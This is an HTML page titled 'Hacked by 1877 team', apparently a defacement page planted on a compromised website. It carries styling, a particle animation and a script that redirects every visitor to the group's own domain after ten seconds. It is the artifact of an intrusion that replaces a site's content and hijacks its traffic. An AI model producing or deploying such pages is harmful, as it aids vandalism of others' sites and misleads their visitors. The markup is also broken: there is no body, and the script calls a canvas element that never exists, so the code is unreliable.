<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Hacked by 1877 team</title>
    <style>
        :root {
            --silver: #C0C0C0;
            --bright-white: #FFFFFF;
            --dark-grey: #1a1a1a;
            --black: #000000;
        }

        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: var(--black);
            color: var(--silver);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        #canvas-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .scanlines {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
                        linear-gradient(90deg, rgba(255, 0, 0, 0.02), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.02));
            background-size: 100% 4px, 3px 100%;
            z-index: 2;
            pointer-events: none;
        }

        .content-wrapper {
            position: relative;
            z-index: 10;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            width: 100%;
            box-sizing: border-box;
        }

        h1 {
            font-size: 4rem;
            font-weight: 900;
            color: var(--bright-white);
            text-transform: uppercase;
            letter-spacing: 15px;
            margin: 0;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
            cursor: default;
        }

        .logo-container {
            margin: 40px 0;
            perspective: 1000px;
        }

        .logo-img {
            width: 250px;
            filter: drop-shadow(0 0 30px var(--silver));
            animation: float 6s infinite ease-in-out, glow-pulse 3s infinite alternate;
        }

        .site-btn {
            text-decoration: none;
            color: var(--black);
            background: linear-gradient(45deg, #888, #fff, #888);
            background-size: 200% auto;
            padding: 18px 60px;
            font-weight: 900;
            font-size: 1.2rem;
            letter-spacing: 8px;
            border: none;
            transition: 0.5s;
            clip-path: polygon(10% 0, 100% 0, 90% 100%, 0% 100%);
            animation: shine-btn 3s infinite linear;
        }

        .site-btn:hover {
            transform: scale(1.1) skew(-5deg);
            box-shadow: 0 0 50px var(--bright-white);
            letter-spacing: 12px;
        }

        footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            padding: 25px 0;
            background: rgba(0, 0, 0, 0.8);
            border-top: 1px solid #333;
            display: flex;
            justify-content: space-around;
            align-items: center;
            z-index: 20;
            font-family: 'Courier New', Courier, monospace;
            letter-spacing: 3px;
            flex-wrap: wrap; /* Allows footer items to stack on mobile */
        }

        .footer-item {
            color: var(--silver);
            font-size: 0.9rem;
            margin: 5px 10px;
        }

        /* Mobile responsiveness adjustments */
        @media (max-width: 768px) {
            h1 { font-size: 2rem; letter-spacing: 5px; }
            .logo-img { width: 150px; }
            .site-btn { padding: 12px 30px; font-size: 1rem; letter-spacing: 4px; }
            footer { flex-direction: column; padding: 10px 0; }
        }

        @keyframes float {
            0%, 100% { transform: translateY(0) rotateY(0deg); }
            50% { transform: translateY(-30px) rotateY(10deg); }
        }

        @keyframes glow-pulse {
            from { filter: drop-shadow(0 0 10px var(--silver)); }
            to { filter: drop-shadow(0 0 40px var(--bright-white)); }
        }

        @keyframes shine-btn {
            to { background-position: 200% center; }
        }
    </style>
</head>

    <script>
        // Redirect after 10 seconds
        setTimeout(function() {
            window.location.href = "https://1877.to";
        }, 10000);

        // --- PARTICLE NEBULA SYSTEM ---
        const canvas = document.getElementById('canvas-bg');
        const ctx = canvas.getContext('2d');
        let particles = [];
        const mouse = { x: null, y: null, radius: 150 };

        window.addEventListener('mousemove', (e) => {
            mouse.x = e.x;
            mouse.y = e.y;
        });

        function resize() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        window.addEventListener('resize', resize);
        resize();

        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.size = Math.random() * 2 + 0.5;
                this.baseX = this.x;
                this.baseY = this.y;
                this.density = (Math.random() * 30) + 1;
            }
            draw() {
                ctx.fillStyle = 'rgba(255, 255, 255, 0.8)';
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fill();
            }
            update() {
                let dx = mouse.x - this.x;
                let dy = mouse.y - this.y;
                let distance = Math.sqrt(dx * dx + dy * dy);
                if (distance < mouse.radius) {
                    let force = (mouse.radius - distance) / mouse.radius;
                    this.x -= (dx / distance) * force * this.density;
                    this.y -= (dy / distance) * force * this.density;
                } else {
                    this.x += (this.baseX - this.x) * 0.05;
                    this.y += (this.baseY - this.y) * 0.05;
                }
            }
        }

        function init() {
            particles = [];
            for (let i = 0; i < 100; i++) particles.push(new Particle());
        }

        function animate() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => { p.draw(); p.update(); });
            requestAnimationFrame(animate);
        }

        init();
        animate();
    </script>
